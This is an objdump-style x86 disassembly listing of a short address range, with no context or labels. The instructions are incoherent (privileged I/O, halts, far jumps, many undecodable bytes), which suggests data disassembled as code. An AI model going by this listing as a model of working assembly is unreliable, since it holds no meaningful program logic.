  41c08e:	mov    ds:0x900053e9,eax
  41c093:	hlt    
  41c094:	adc    ebx,eax
  41c096:	xchg   edi,eax
  41c097:	addr16 stc 
  41c099:	cmp    DWORD PTR [esi+ecx*4+0x59],ebp
  41c09d:	sub    DWORD PTR [eax],0x6416a437
  41c0a3:	xchg   esi,eax
  41c0a4:	stos   DWORD PTR es:[edi],eax
  41c0a5:	shl    BYTE PTR [edi-0x54df04b6],cl
  41c0ab:	mov    ch,0xdd
  41c0ad:	shr    BYTE PTR [eax-0x40143ca1],cl
  41c0b3:	test   ah,dl
  41c0b5:	mov    ecx,0xd2c8fe05
  41c0ba:	lods   eax,DWORD PTR ds:[esi]
  41c0bb:	xchg   BYTE PTR [esp+0x1ce44a8e],al
  41c0c2:	in     al,dx
  41c0c3:	iret   
  41c0c4:	mov    dh,0xef
  41c0c6:	sahf   
  41c0c7:	mov    eax,0x330bc59d
  41c0cc:	cdq    
  41c0cd:	inc    edi
  41c0ce:	adc    BYTE PTR [ebx+eiz*4],al
  41c0d1:	es push ds
  41c0d3:	and    al,0x45
  41c0d5:	mov    ds:0x7eddd766,eax
  41c0da:	stos   DWORD PTR es:[edi],eax
  41c0db:	xor    ebp,ecx
  41c0dd:	push   0x41672307
  41c0e2:	sub    ebx,DWORD PTR [eax]
  41c0e4:	clc    
  41c0e5:	sub    DWORD PTR [edi+0x6837179b],0xffffff8d
  41c0ec:	adc    eax,DWORD PTR [ecx+ebx*4]
  41c0ef:	hlt    
  41c0f0:	pop    esi
  41c0f1:	arpl   bx,di
  41c0f3:	fcomi  st,st(1)
  41c0f5:	jle    0x41c083
  41c0f7:	stos   DWORD PTR es:[edi],eax
  41c0f8:	std    
  41c0f9:	lods   al,BYTE PTR ds:[esi]
  41c0fa:	fisttp WORD PTR [edi-0xa]
  41c0fd:	inc    edx
  41c0fe:	push   0x2
  41c100:	scas   al,BYTE PTR es:[edi]
  41c101:	jns    0x41c088
  41c103:	in     al,dx
  41c104:	lods   eax,DWORD PTR ds:[esi]
  41c105:	popf   
  41c106:	pop    esi
  41c107:	adc    al,0xc9
  41c109:	clc    
  41c10a:	cmp    DWORD PTR [eax+0x44d81ae2],0x701780f4
  41c114:	push   esi
  41c115:	xor    al,0xa5
  41c117:	mov    bh,0x65
  41c119:	sbb    dl,ah
  41c11b:	xchg   BYTE PTR [edi+ebx*2+0x58dd60ab],dh
  41c122:	add    al,0xd0
  41c124:	addr16 dec esi
  41c126:	sub    al,0xa3
  41c128:	inc    edx
  41c129:	push   ebx
  41c12a:	xchg   ebp,eax
  41c12b:	fstp   DWORD PTR [ebp+0x73492840]
  41c131:	cld    
  41c132:	xor    eax,0x1416dd7d
  41c137:	jecxz  0x41c193
  41c139:	pop    esp
  41c13a:	xchg   ebx,eax
  41c13b:	sbb    al,ah
  41c13d:	cmp    BYTE PTR [edi],ch
  41c13f:	sti    
  41c140:	outs   dx,BYTE PTR ds:[esi]
  41c141:	push   ecx
  41c142:	add    BYTE PTR [edi+0x16c6b4c],0x95
  41c149:	jbe    0x41c0e5
  41c14b:	fdiv   QWORD PTR [edx]
  41c14d:	push   esi
  41c14e:	cmp    DWORD PTR fs:[ecx+0x14],ebx
  41c152:	sbb    BYTE PTR [ecx-0x561178b9],ch
  41c158:	test   edi,edi
  41c15a:	into   
  41c15b:	xchg   BYTE PTR [edx],bh
  41c15d:	addr16 pop edi
  41c15f:	pop    ecx
  41c160:	faddp  st(7),st
  41c162:	js     0x41c18a
  41c164:	and    DWORD PTR [ebp-0x4bb23f65],ebp
  41c16a:	gs and eax,0x899d969f
  41c170:	popa   
  41c171:	and    BYTE PTR [eax-0x2e],bh
  41c174:	adc    DWORD PTR [ecx-0x4c],edx
  41c177:	das    
  41c178:	jne    0x41c1f6
  41c17a:	pop    esi
  41c17b:	es mov edi,0xd17cf78c
  41c181:	pop    esi
  41c182:	mov    ch,dh
  41c184:	mov    ecx,0x8286f5d4
  41c189:	push   esi
  41c18a:	xchg   BYTE PTR [esi],dl
  41c18c:	loop   0x41c174
  41c18e:	in     al,0x9b
  41c190:	fiadd  DWORD PTR [eax]
  41c192:	pop    eax
  41c193:	(bad)  
  41c194:	push   edx
  41c195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c196:	fld    DWORD PTR [ebx-0x79380f4e]
  41c19c:	pop    ebx
  41c19d:	cli    
  41c19e:	jo     0x41c138
  41c1a0:	fnstsw WORD PTR [edx-0x61f618b4]
  41c1a6:	xchg   ecx,eax
  41c1a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1a8:	ins    BYTE PTR es:[edi],dx
  41c1a9:	fsub   DWORD PTR [eax-0x11]
  41c1ac:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1ae:	push   0xffffff88
  41c1b0:	outs   dx,BYTE PTR ds:[esi]
  41c1b1:	call   0xe699:0x449d4232
  41c1b8:	in     al,0xed
  41c1ba:	div    DWORD PTR [edi]
  41c1bc:	dec    edi
  41c1bd:	mov    al,ds:0x4fd01670
  41c1c2:	lds    ecx,FWORD PTR [eax+0x62]
  41c1c5:	in     eax,0x37
  41c1c7:	mov    bh,0x55
  41c1c9:	push   eax
  41c1ca:	dec    esi
  41c1cb:	and    bl,ch
  41c1cd:	ins    BYTE PTR es:[edi],dx
  41c1ce:	dec    eax
  41c1cf:	jo     0x41c234
  41c1d1:	cdq    
  41c1d2:	popf   
  41c1d3:	pop    DWORD PTR [eax+0x408b9bb6]
  41c1d9:	sbb    esp,DWORD PTR [esp+ecx*4+0x29]
  41c1dd:	shl    dh,0x5c
  41c1e0:	mov    bh,0x79
  41c1e2:	sahf   
  41c1e3:	sub    ah,BYTE PTR [edi]
  41c1e5:	test   BYTE PTR [edi-0x3c],dh
  41c1e8:	sbb    al,al
  41c1ea:	jg     0x41c1a8
  41c1ec:	mov    eax,0x4b5be2ed
  41c1f1:	inc    edi
  41c1f2:	fist   WORD PTR [edx+0x65979aa5]
  41c1f8:	retf   
  41c1f9:	jbe    0x41c20f
  41c1fb:	jo     0x41c19e
  41c1fd:	jno    0x41c264
  41c1ff:	jecxz  0x41c1cf
  41c201:	and    ah,dl
  41c203:	mov    DWORD PTR [edx+eax*8],esi
  41c206:	pop    ds
  41c207:	icebp  
  41c208:	xchg   ebp,eax
  41c209:	out    0xd5,eax
  41c20b:	dec    ecx
  41c20c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c20d:	rcr    BYTE PTR [ebx+eax*8-0x30db644f],0x99
  41c215:	inc    eax
  41c216:	mov    edi,0xbba2dc1b
  41c21b:	test   eax,0xc2d4ac5b
  41c220:	fcmovnb st,st(0)
  41c222:	es or  al,0x67
  41c225:	sub    bl,cl
  41c227:	mov    ?,WORD PTR [edi+0x40]
  41c22a:	inc    ebx
  41c22b:	xchg   ebp,eax
  41c22c:	push   ss
  41c22d:	ins    BYTE PTR es:[edi],dx
  41c22e:	mov    BYTE PTR [ebp+0x4ca56a22],ah
  41c234:	mov    esp,0xafacb798
  41c239:	adc    BYTE PTR es:0x86e88cea,cl
  41c240:	jl     0x41c247
  41c242:	es pusha 
  41c244:	fisttp QWORD PTR [ebx]
  41c246:	sbb    al,0xb1
  41c248:	repnz ficomp WORD PTR fs:[ecx]
  41c24c:	add    eax,0xd5a02b40
  41c251:	or     eax,0x3dd72f1d
  41c256:	cwde   
  41c257:	mov    ebp,0x8b0dc3a9
  41c25c:	sub    dl,ch
  41c25e:	jp     0x41c20a
  41c260:	mov    eax,0xb287167b
  41c265:	fwait
  41c266:	jmp    edx
  41c268:	ffree  st(3)
  41c26a:	retf   0xca02
  41c26d:	mov    WORD PTR [ebp+0x64],?
  41c270:	push   ebp
  41c271:	inc    eax
  41c272:	pop    ecx
  41c273:	sbb    dl,BYTE PTR [edx+0xd9372f4]
  41c279:	inc    ebp
  41c27a:	xchg   edi,eax
  41c27b:	test   DWORD PTR [esi-0x11],ecx
  41c27e:	jle    0x41c25e
  41c280:	mov    dl,0x35
  41c282:	xor    eax,0x9b257f7d
  41c287:	mov    esi,0x1216951b
  41c28c:	ins    DWORD PTR es:[edi],dx
  41c28d:	lea    ebx,[edi-0x7fd0228f]
  41c293:	dec    edx
  41c294:	xchg   DWORD PTR [edx-0x41],edi
  41c297:	push   esp
  41c298:	bound  eax,QWORD PTR [ebx-0x3c]
  41c29b:	int    0xf5
  41c29d:	mov    bh,0xcf
  41c29f:	fnstsw WORD PTR [ebp-0x2a]
  41c2a2:	mov    ebp,ebx
  41c2a4:	sbb    ah,dl
  41c2a6:	push   edi
  41c2a7:	(bad)  
  41c2a8:	fistp  QWORD PTR [ebx+0x28980a43]
  41c2ae:	and    al,0xc
  41c2b0:	or     DWORD PTR [eax+esi*2-0x76],eax
  41c2b4:	cli    
  41c2b5:	loopne 0x41c294
  41c2b7:	add    ch,bl
  41c2b9:	mov    ebx,0x884c44a8
  41c2be:	mov    bh,0xff
  41c2c0:	mov    es,WORD PTR [eax+0x2f]
  41c2c3:	add    al,0x53
  41c2c5:	es xchg esi,eax
  41c2c7:	dec    esp
  41c2c9:	cmp    bl,BYTE PTR [eax-0x71667b11]
  41c2cf:	inc    esi
  41c2d0:	mov    esi,DWORD PTR [ebp+0x51]
  41c2d3:	or     al,0x7d
  41c2d5:	inc    eax
  41c2d6:	test   al,0x2
  41c2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2d9:	mov    ebx,0x130290d5
  41c2de:	(bad)  
  41c2df:	xor    BYTE PTR [ecx],dh
  41c2e1:	mov    ds:0xcf2857a5,al
  41c2e6:	out    dx,al
  41c2e7:	pop    esi
  41c2e8:	jg     0x41c29b
  41c2ea:	mov    ds:0x603fe146,al
  41c2ef:	adc    dl,al
  41c2f1:	jns    0x41c2c2
  41c2f3:	pop    DWORD PTR [ebx]
  41c2f5:	cmp    al,0xb4
  41c2f7:	scas   eax,DWORD PTR es:[edi]
  41c2f8:	xchg   edx,eax
  41c2f9:	dec    esi
  41c2fa:	xchg   edi,eax
  41c2fb:	test   DWORD PTR [edx+eax*4],edi
  41c2fe:	imul   ebx,esi,0x992c4073
  41c304:	and    al,BYTE PTR [edi-0x35568ca6]
  41c30a:	xchg   edi,eax
  41c30b:	xor    BYTE PTR [esi],0x2b
  41c30e:	mov    ah,0x42
  41c310:	inc    edi
  41c311:	in     al,dx
  41c312:	pusha  
  41c313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c314:	loop   0x41c370
  41c316:	xor    al,0xa4
  41c318:	fstp   TBYTE PTR [esi+0x16e386b0]
  41c31e:	mov    bh,0xa7
  41c320:	pushf  
  41c321:	rcl    BYTE PTR [edi-0x169bcc95],cl
  41c327:	int    0x21
  41c329:	jnp    0x41c2ef
  41c32b:	call   0xd331:0xb7efb3dd
  41c332:	and    al,0x35
  41c334:	sbb    eax,DWORD PTR [edx+0x292b2f2e]
  41c33a:	into   
  41c33b:	push   es
  41c33c:	mov    ds:0xe0dd7b1f,eax
  41c341:	cld    
  41c342:	jp     0xa079d2a3
  41c348:	cmp    DWORD PTR [edi+edx*1],0xafbcddc8
  41c34f:	cmp    DWORD PTR [ecx+0x59edc785],edi
  41c355:	inc    edi
  41c356:	xor    bh,BYTE PTR [ebx]
  41c358:	mov    ds:0x642a4194,eax
  41c35d:	dec    eax
  41c35e:	or     bl,BYTE PTR [bp+si-0x5d]
  41c362:	jge    0x41c3dc
  41c364:	fld    QWORD PTR [ebp+0x73]
  41c367:	(bad)  
  41c368:	xlat   BYTE PTR ds:[ebx]
  41c369:	pop    ds
  41c36a:	popf   
  41c36b:	mov    eax,0x441fb198
  41c370:	push   ss
  41c371:	daa    
  41c372:	cwde   
  41c373:	into   
  41c374:	jns    0x41c3d6
  41c376:	sti    
  41c377:	push   edx
  41c378:	jbe    0x41c363
  41c37a:	xchg   edi,eax
  41c37b:	(bad)  [ecx-0x4f]
  41c37e:	and    eax,0x711de1db
  41c383:	loopne 0x41c359
  41c385:	leave  
  41c386:	arpl   si,ax
  41c388:	sbb    ah,bl
  41c38a:	cdq    
  41c38b:	push   0xed66cdad
  41c390:	cmp    eax,0xdd73ce83
  41c395:	dec    eax
  41c396:	mov    ds:0x41025e9c,al
  41c39b:	jmp    0x41c3e0
  41c39d:	inc    eax
  41c39e:	fwait
  41c39f:	pop    esp
  41c3a0:	ret    0x9372
  41c3a3:	sub    DWORD PTR [edi],0x33f9d3d9
  41c3a9:	inc    eax
  41c3aa:	jbe    0x41c420
  41c3ac:	add    esi,DWORD PTR [ebx+0x2d]
  41c3af:	xor    dh,BYTE PTR [esi]
  41c3b1:	inc    eax
  41c3b2:	push   ds
  41c3b3:	mov    bh,0xf8
  41c3b5:	pop    esp
  41c3b6:	push   esi
  41c3b7:	add    DWORD PTR [ecx],esi
  41c3b9:	xor    bl,BYTE PTR [ebx-0x6c81d52b]
  41c3bf:	sbb    BYTE PTR [eax-0x20],cl
  41c3c2:	mov    esp,0x5d4091b3
  41c3c7:	mov    al,ds:0xe567856
  41c3cc:	inc    esp
  41c3cd:	leave  
  41c3ce:	xchg   edi,eax
  41c3cf:	xlat   BYTE PTR ds:[ebx]
  41c3d0:	mov    edx,DWORD PTR [esi]
  41c3d2:	pushf  
  41c3d3:	mov    ebp,0xfde3c45d
  41c3d8:	dec    edx
  41c3d9:	sub    BYTE PTR [edx-0x6b],0x7d
  41c3dd:	xchg   ebx,eax
  41c3de:	fild   WORD PTR [ebp+0x11b6e6e2]
  41c3e4:	mov    bh,BYTE PTR [ebx+0x37c7bd97]
  41c3ea:	test   eax,0xddbb85d4
  41c3ef:	cwde   
  41c3f0:	cmp    al,BYTE PTR [eax+0x70]
  41c3f3:	add    al,0x62
  41c3f5:	inc    esi
  41c3f6:	bound  ebp,QWORD PTR [edi+0x232811bb]
  41c3fc:	frstor [ebp+ebx*2-0x66]
  41c400:	lahf   
  41c401:	loopne 0x41c3a6
  41c403:	dec    ebx
  41c404:	mov    DWORD PTR [eax-0x78],eax
  41c407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c408:	mov    dl,0x2e
  41c40a:	add    al,0xe
  41c40c:	int3   
  41c40d:	xchg   esp,eax
  41c40e:	xchg   edi,eax
  41c40f:	ins    BYTE PTR es:[edi],dx
  41c410:	test   eax,0x8ef7523
  41c415:	sti    
  41c416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c417:	lahf   
  41c418:	adc    al,0xe6
  41c41a:	ret    
  41c41b:	mov    ds:0x4a29b79f,eax
  41c420:	pop    ebp
  41c421:	xchg   esp,eax
  41c422:	shl    BYTE PTR [esi-0x3d37b823],1
  41c428:	mov    edi,0x24338005
  41c42d:	inc    eax
  41c42e:	push   es
  41c42f:	cmp    DWORD PTR [eax+ecx*1-0x7bd1a8cf],edx
  41c436:	mov    ch,0xc3
  41c438:	mov    dl,0x2c
  41c43a:	cwde   
  41c43b:	outs   dx,DWORD PTR ds:[esi]
  41c43c:	int3   
  41c43d:	outs   dx,BYTE PTR ds:[esi]
  41c43e:	enter  0xace4,0x40
  41c442:	jecxz  0x41c480
  41c444:	ficomp DWORD PTR [ebp-0x4d]
  41c447:	daa    
  41c448:	and    eax,0x3afd996b
  41c44d:	in     al,dx
  41c44e:	sub    edi,ebx
  41c450:	jl     0x41c3d2
  41c452:	aaa    
  41c453:	pushf  
  41c454:	aas    
  41c455:	dec    ecx
  41c456:	mov    eax,0x980a7a37
  41c45b:	lds    esi,FWORD PTR ds:0xe0fa9d80
  41c461:	dec    ecx
  41c462:	into   
  41c463:	dec    edi
  41c464:	xchg   ebp,eax
  41c465:	sub    al,0x9f
  41c467:	ins    DWORD PTR es:[edi],dx
  41c468:	js     0x41c465
  41c46a:	jne    0x41c4c3
  41c46c:	push   ss
  41c46d:	and    ah,bh
  41c46f:	jl     0x41c4c1
  41c471:	jne    0x41c4a7
  41c473:	xchg   DWORD PTR [edi-0x22b11772],esi
  41c479:	inc    eax
  41c47a:	jbe    0x41c45a
  41c47c:	call   0xa70a500
  41c481:	inc    ecx
  41c482:	add    ebp,esi
  41c484:	stos   DWORD PTR es:[edi],eax
  41c485:	ret    0xe3fa
  41c488:	loopne 0x41c4b9
  41c48a:	xchg   ebx,eax
  41c48b:	add    bl,ch
  41c48d:	rol    DWORD PTR gs:[edi+0x36],1
  41c491:	inc    edi
  41c492:	loop   0x41c462
  41c494:	mov    BYTE PTR [eax+0x27],0xc6
  41c498:	scas   eax,DWORD PTR es:[edi]
  41c499:	les    ebx,FWORD PTR [ebp-0x1a]
  41c49c:	jl     0x41c49b
  41c49e:	xchg   edi,eax
  41c49f:	mov    dh,0xb4
  41c4a1:	sbb    DWORD PTR [esi+edx*2],ebp
  41c4a4:	dec    cl
  41c4a6:	jmp    0x41c433
  41c4a8:	jge    0x41c48f
  41c4aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ab:	xchg   BYTE PTR [edi],ah
  41c4ad:	idiv   esp
  41c4af:	pop    eax
  41c4b0:	sbb    al,0x69
  41c4b2:	xor    al,0x47
  41c4b4:	jne    0x41c500
  41c4b6:	stos   BYTE PTR es:[edi],al
  41c4b7:	xchg   ch,ah
  41c4b9:	push   0xffffff87
  41c4bb:	in     eax,dx
  41c4bc:	out    dx,al
  41c4bd:	and    ebx,edx
  41c4bf:	xchg   BYTE PTR [ecx-0x39],dh
  41c4c2:	inc    esi
  41c4c3:	pop    eax
  41c4c4:	fst    QWORD PTR [ebx]
  41c4c6:	gs push edi
  41c4c8:	lock mov ds:0x406a4a27,eax
  41c4ce:	enter  0x3f3d,0x29
  41c4d2:	int3   
  41c4d3:	out    0x37,al
  41c4d5:	aas    
  41c4d6:	cwde   
  41c4d7:	xchg   ebx,eax
  41c4d8:	loope  0x41c510
  41c4da:	arpl   WORD PTR [esi],sp
  41c4dc:	xchg   sp,ax
  41c4de:	mov    eax,ds:0xea40b47f
  41c4e3:	or     BYTE PTR [eax-0x67],0x1f
  41c4e7:	ror    DWORD PTR [esi+0x55cb981d],0x13
  41c4ee:	xchg   esp,eax
  41c4ef:	cli    
  41c4f0:	lahf   
  41c4f1:	sub    al,0xf0
  41c4f3:	jae    0x41c47f
  41c4f5:	fisttp DWORD PTR [eax]
  41c4f7:	xchg   DWORD PTR [ebx],edx
  41c4f9:	pop    ebx
  41c4fa:	retf   0xdd88
  41c4fd:	jnp    0x41c576
  41c4ff:	pop    esp
  41c500:	sub    dh,BYTE PTR [ebp-0xc]
  41c503:	dec    edx
  41c504:	cmc    
  41c505:	aas    
  41c506:	mov    ah,0xcd
  41c508:	sar    DWORD PTR [edx+0x60af67f],cl
  41c50e:	lahf   
  41c50f:	mov    ds:0x3f060e94,al
  41c514:	cmp    eax,0xed50ba8d
  41c519:	dec    ebp
  41c51a:	rcr    BYTE PTR ds:0x5f181ae8,1
  41c520:	mov    dl,0x30
  41c522:	ja     0x41c512
  41c524:	push   esi
  41c525:	push   0xffffff97
  41c527:	imul   ebx,DWORD PTR [ecx],0xffffff9c
  41c52a:	or     al,0xf0
  41c52c:	mov    bh,0x6b
  41c52e:	mov    ebx,ds
  41c530:	pop    ecx
  41c531:	enter  0x86fd,0x3b
  41c535:	jnp    0x41c4d6
  41c537:	jne    0x41c516
  41c539:	enter  0x4895,0x8c
  41c53d:	jmp    0x407dc5f0
  41c542:	cs jo  0x41c59d
  41c545:	data16 cmc 
  41c547:	js     0x41c4e0
  41c549:	push   ds
  41c54a:	lahf   
  41c54b:	sbb    DWORD PTR [edi+0x53],0xffffffd3
  41c54f:	pop    ebx
  41c550:	dec    ebp
  41c551:	mov    esi,0x3fdedace
  41c556:	dec    ebx
  41c557:	pop    edi
  41c558:	sar    BYTE PTR [ecx+0x33aabc28],cl
  41c55e:	cwde   
  41c55f:	icebp  
  41c560:	cld    
  41c561:	int    0xf5
  41c563:	mov    edi,ebp
  41c565:	cmp    BYTE PTR [edi+0x6932c9f9],ch
  41c56b:	xchg   DWORD PTR [eax+0x4b],esi
  41c56e:	xchg   DWORD PTR [ebp+0x5105591c],edx
  41c574:	(bad)  
  41c575:	lock sub BYTE PTR [edi-0x4b68e09a],al
  41c57c:	pop    ebp
  41c57d:	pop    edi
  41c57e:	(bad)  
  41c57f:	mov    ?,ecx
  41c581:	mov    edi,0x66a7dd4f
  41c586:	xchg   edi,eax
  41c587:	xor    esp,ebp
  41c589:	dec    ecx
  41c58a:	add    BYTE PTR [eax-0x277c2fe2],al
  41c590:	push   esp
  41c591:	inc    eax
  41c592:	or     BYTE PTR [esp+ecx*2],al
  41c595:	adc    DWORD PTR [ebp-0x688270ce],ebx
  41c59b:	in     al,dx
  41c59c:	fst    DWORD PTR [eax-0x8bd5d8f]
  41c5a2:	loopne 0x41c59f
  41c5a4:	lds    edx,FWORD PTR [esi-0x18ab77c5]
  41c5aa:	jge    0x41c59d
  41c5ac:	enter  0x1980,0xf8
  41c5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b1:	test   eax,0x3c3e29bb
  41c5b6:	cwde   
  41c5b7:	xor    DWORD PTR [edx+esi*2+0x43cb7211],ebp
  41c5be:	dec    eax
  41c5bf:	xchg   esp,eax
  41c5c0:	pop    esi
  41c5c1:	lods   eax,DWORD PTR ds:[esi]
  41c5c2:	push   cs
  41c5c3:	mov    ch,0x65
  41c5c5:	adc    edi,DWORD PTR [esi-0x3b]
  41c5c8:	fstp   QWORD PTR [ebx+0x1f]
  41c5cb:	rcr    DWORD PTR [ecx],0x80
  41c5ce:	ds adc eax,0x75bc403e
  41c5d4:	lahf   
  41c5d5:	loope  0x41c643
  41c5d7:	xchg   esp,eax
  41c5d8:	retf   
  41c5d9:	in     eax,0x14
  41c5db:	cmp    eax,0x379613e1
  41c5e0:	leave  
  41c5e1:	out    0x17,al
  41c5e3:	jg     0x41c595
  41c5e5:	loop   0x41c5d1
  41c5e7:	inc    ebp
  41c5e8:	mov    esi,0x4086bcd1
  41c5ed:	ss sahf 
  41c5ef:	push   edx
  41c5f0:	fst    QWORD PTR [esi]
  41c5f2:	sbb    DWORD PTR [edx+ebx*2-0x2a64f6a2],edi
  41c5f9:	jl     0x41c5d4
  41c5fb:	iret   
  41c5fc:	fisttp QWORD PTR [eax-0x75]
  41c5ff:	mov    edi,0x512540f3
  41c604:	fld    QWORD PTR [edi+ebx*1+0x23]
  41c608:	mov    ds:0x70fc4295,al
  41c60d:	inc    eax
  41c60e:	(bad)  
  41c60f:	(bad)  
  41c611:	nop
  41c612:	inc    edi
  41c613:	loope  0x41c65f
  41c615:	iret   
  41c616:	xchg   DWORD PTR [ebx-0x6],esp
  41c619:	imul   DWORD PTR [esi+0x15639d01]
  41c61f:	or     bl,BYTE PTR [ebx-0x6df445d3]
  41c625:	sahf   
  41c626:	xchg   ebx,eax
  41c627:	xchg   esp,ebp
  41c629:	or     ch,BYTE PTR [edx]
  41c62b:	lahf   
  41c62c:	lea    ecx,[ebx]
  41c62e:	lahf   
  41c62f:	cmp    BYTE PTR [eax],0x87
  41c632:	jmp    ebx
  41c634:	std    
  41c635:	sbb    al,BYTE PTR [ecx+ebp*2-0xe]
  41c639:	aas    
  41c63a:	popf   
  41c63b:	jo     0x41c66a
  41c63d:	sub    BYTE PTR [edx],bl
  41c63f:	inc    ebp
  41c640:	pop    esi
  41c641:	les    edi,FWORD PTR [ebp-0x5cf009d6]
  41c647:	dec    ecx
  41c648:	nop
  41c649:	inc    eax
  41c64a:	push   edx
  41c64b:	adc    DWORD PTR [ecx],ebx
  41c64d:	retf   
  41c64e:	mov    DWORD PTR [edx-0x788d7f7b],edi
  41c654:	out    0xbf,al
  41c656:	or     bl,BYTE PTR [ebx+edi*8-0x32280f5d]
  41c65d:	push   ds
  41c65e:	cmp    al,0x5b
  41c660:	outs   dx,BYTE PTR ds:[esi]
  41c661:	inc    eax
  41c662:	cwde   
  41c663:	loopne 0x41c61f
  41c665:	sub    esi,DWORD PTR [ebx-0x4a]
  41c668:	jmp    0x4179:0xd62f97f8
  41c66f:	sbb    DWORD PTR [ecx+0x1f73fa5d],0x2d8863bd
  41c679:	push   ebp
  41c67a:	out    dx,eax
  41c67b:	aaa    
  41c67c:	sbb    al,0x34
  41c67e:	push   cs
  41c67f:	push   edi
  41c680:	loopne 0x41c62f
  41c682:	add    DWORD PTR [esi-0x78],0xf8a35937
  41c689:	bound  ecx,QWORD PTR [edi+eax*1-0x19]
  41c68d:	jecxz  0x41c67b
  41c68f:	xchg   ebp,eax
  41c690:	sbb    eax,0xabfa70c
  41c695:	repnz xchg edi,eax
  41c697:	(bad)  
  41c698:	mov    edi,0x5ae6b090
  41c69d:	sub    DWORD PTR ds:0x98a3ce17,0xffffff86
  41c6a4:	sbb    edx,DWORD PTR [edi]
  41c6a6:	in     al,dx
  41c6a7:	and    ch,bl
  41c6a9:	cmp    ebp,ebp
  41c6ab:	ret    
  41c6ac:	add    eax,0xb10ba6db
  41c6b1:	sub    al,0x1a
  41c6b3:	icebp  
  41c6b4:	mov    al,0x79
  41c6b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6b7:	xchg   DWORD PTR [edx],edi
  41c6b9:	sbb    al,0x73
  41c6bb:	dec    edx
  41c6bc:	out    0xd5,eax
  41c6be:	xchg   edi,eax
  41c6bf:	outs   dx,BYTE PTR ds:[esi]
  41c6c0:	(bad)  
  41c6c1:	jne    0x41c68a
  41c6c3:	dec    edx
  41c6c4:	and    eax,DWORD PTR [ebx-0x461a6897]
  41c6ca:	setbe  BYTE PTR [edi+edi*4+0x5dc04d6]
  41c6d2:	sub    BYTE PTR [edi-0x23],dl
  41c6d5:	retf   0xac28
  41c6d8:	adc    BYTE PTR [ebx],0x7c
  41c6db:	(bad)  
  41c6dc:	ds inc eax
  41c6de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6df:	dec    eax
  41c6e0:	ins    BYTE PTR es:[edi],dx
  41c6e1:	outs   dx,BYTE PTR ds:[esi]
  41c6e2:	fadd   DWORD PTR ds:0x5e979a86
  41c6e8:	or     BYTE PTR [ebx],ch
  41c6ea:	mov    eax,0x585999f6
  41c6ef:	scas   al,BYTE PTR es:[edi]
  41c6f0:	mov    edx,0xc287ce79
  41c6f5:	mov    dl,0x18
  41c6f7:	gs (bad) 
  41c6f9:	ret    0x75b6
  41c6fc:	in     al,dx
  41c6fd:	out    0x31,al
  41c6ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c700:	int3   
  41c701:	addr16 jnp 0x41c6ba
  41c704:	lods   eax,DWORD PTR ds:[esi]
  41c705:	mov    al,0xb
  41c707:	pushf  
  41c708:	fild   DWORD PTR [eax+0x52]
  41c70b:	in     al,0x7e
  41c70d:	retf   
  41c70e:	push   ss
  41c70f:	imul   eax,DWORD PTR [esi],0x7d80976a
  41c715:	cli    
  41c716:	daa    
  41c717:	inc    eax
  41c718:	je     0x41c6a8
  41c71a:	ds sbb eax,0x86f7bebc
  41c720:	call   0xddb05370
  41c725:	or     DWORD PTR [ebx],eax
  41c727:	adc    eax,0xa05acc47
  41c72c:	fild   DWORD PTR [eax+0x33]
  41c72f:	and    DWORD PTR [ebx+0x4321f246],eax
  41c735:	add    eax,0x43405798
  41c73a:	xchg   DWORD PTR [edi],ecx
  41c73c:	je     0x41c6f5
  41c73e:	ins    DWORD PTR es:[edi],dx
  41c73f:	clc    
  41c740:	mov    ch,0xc3
  41c742:	enter  0x9f86,0x2e
  41c746:	aam    0xa0
  41c748:	sti    
  41c749:	xchg   esp,eax
  41c74a:	call   0xdc086be2
  41c74f:	call   0x3abbe7ef
  41c754:	pusha  
  41c755:	andps  xmm4,XMMWORD PTR [ecx-0x62]
  41c759:	push   es
  41c75a:	dec    DWORD PTR [eax-0x19a82588]
  41c760:	(bad)  
  41c762:	xchg   edi,eax
  41c763:	push   eax
  41c764:	xchg   ebp,eax
  41c765:	and    al,0x29
  41c767:	rcr    ah,0x54
  41c76a:	repz sahf 
  41c76c:	ror    edi,1
  41c76e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c76f:	xchg   BYTE PTR [edx],dl
  41c771:	adc    eax,0xbbdd7ef5
  41c776:	out    0xe8,eax
  41c778:	(bad)  
  41c77a:	out    dx,eax
  41c77b:	dec    esp
  41c77c:	and    DWORD PTR [edi+esi*2+0x46],eax
  41c780:	ret    
  41c781:	dec    ebx
  41c782:	lods   eax,DWORD PTR ds:[esi]
  41c783:	les    eax,FWORD PTR [ebx-0x12]
  41c786:	lods   al,BYTE PTR ds:[esi]
  41c787:	push   es
  41c788:	ficom  WORD PTR [edx-0x2a]
  41c78b:	or     DWORD PTR [esi-0x265c0b36],edi
  41c791:	and    BYTE PTR [esi],bh
  41c793:	neg    BYTE PTR [ebp-0x626b4eca]
  41c799:	xchg   BYTE PTR [ecx],cl
  41c79b:	jb     0x41c7ae
  41c79d:	repz mov bl,0xfc
  41c7a0:	aad    0x43
  41c7a2:	pop    ss
  41c7a3:	push   eax
  41c7a4:	sti    
  41c7a5:	sub    DWORD PTR [edi-0x3bb90b21],0xfffffff1
  41c7ac:	inc    ebp
  41c7ad:	cmp    al,BYTE PTR [esi-0x7c2dc14e]
  41c7b3:	(bad)  
  41c7b4:	fucom  st(3)
  41c7b6:	xor    eax,0x8f73ab44
  41c7bb:	stos   DWORD PTR es:[edi],eax
  41c7bc:	lock dec esi
  41c7be:	js     0x41c7aa
  41c7c0:	push   ss
  41c7c1:	mov    ecx,0x691cd637
  41c7c6:	fiadd  DWORD PTR [eax-0x23]
  41c7c9:	xchg   esp,eax
  41c7ca:	pop    edx
  41c7cb:	fstp   TBYTE PTR [ecx*1+0x4c827131]
